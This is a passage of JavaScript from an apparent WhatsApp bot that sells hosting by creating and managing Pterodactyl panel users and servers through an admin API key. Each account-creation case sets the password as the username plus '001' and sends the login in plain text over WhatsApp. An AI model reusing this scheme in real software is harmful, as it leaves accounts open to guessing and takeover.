https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner && !IsSeler) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
            case 'suspend': {
            if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isOwner) return reply(`Khusus Hard Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "listadmin1": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'reinstall1': {
if (!isOwner) return reply(`Khusus Hardz Offcial Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "delusr1": {
  if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "delsrv1": {
      if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case 'updatesrv1': {
if (!isOwner) return reply(`Khusus Hz Offcial Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
 case 'premlist1':{
if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)
let listprem =`*LIST SELER HARDZ OFFCIAL*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem1 628xxx/@tag`
Biiofc.sendMessage(m.chat, {text: listprem },{quoted: Biiofc.chat})
}
break
 case "listusr1": {
if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listsrv1": {
